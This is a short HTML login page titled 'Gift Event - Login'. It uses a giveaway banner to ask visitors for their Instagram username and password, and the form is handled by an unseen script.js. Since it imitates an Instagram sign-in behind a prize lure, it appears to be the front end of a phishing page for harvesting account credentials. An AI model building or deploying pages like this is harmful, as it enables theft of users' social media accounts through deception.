<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Event - Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="event-banner">🎁 Welcome to the Gift Event! 🎉</div>
        <h1 class="title">Login with your Instagram Account</h1>

        <form id="loginForm" class="login-form">
            <input type="text" id="email" placeholder="Email, Phone number or Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
            <div id="spinner" class="spinner" style="display: none;"></div>
        </form>

        <div id="message" class="message"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
